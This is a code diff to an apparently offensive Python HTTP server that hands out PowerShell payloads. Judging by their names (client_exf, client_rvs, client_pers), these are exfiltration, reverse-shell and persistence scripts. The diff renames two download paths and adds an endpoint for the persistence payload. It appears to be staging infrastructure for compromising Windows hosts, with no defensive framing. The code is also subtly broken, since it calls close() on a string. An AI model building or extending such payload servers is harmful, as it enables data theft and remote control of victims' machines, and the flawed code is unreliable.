@@ -33,7 +33,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 log('[-] Error while sending both files.',print_console=True,trace_time=True)
                 self.send_response(404)
                 self.wfile.write(b'Not Found')
-        elif self.path == '/client_exf.ps1':
+        elif self.path == '/client_exf':
             try:
                 file_to_open = open('client_exf.ps1','r').read()
                 self.send_response(200)
@@ -46,7 +46,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 log('[-] File client_exf.ps1 does not exist.',print_console=True,trace_time=True)
                 self.send_response(404)
                 self.wfile.write(b'Not Found')
-        elif self.path == '/client_rvs.ps1':
+        elif self.path == '/client_rvs':
             try:
                 file_to_open = open('client_rvs.ps1','r').read()
                 self.send_response(200)
@@ -57,6 +57,19 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 file_to_open.close()
             except:
                 log('[-] File client_rvs.ps1 does not exist.',print_console=True,trace_time=True)
+                self.send_response(404)
+                self.wfile.write(b'Not Found')
+        elif self.path == '/client_pers':
+            try:
+                file_to_open = open('client_pers.ps1','r').read()
+                self.send_response(200)
+                self.send_header('Content-type', 'text')
+                self.end_headers()
+                self.wfile.write(bytes(file_to_open, 'utf-8'))
+                log('[+] File client_pers.ps1 has been requested and was sent!',print_console=True,trace_time=True)
+                file_to_open.close()
+            except:
+                log('[-] File client_pers.ps1 does not exist.',print_console=True,trace_time=True)
                 self.send_response(404)
                 self.wfile.write(b'Not Found')
         elif headers['Proof']:    
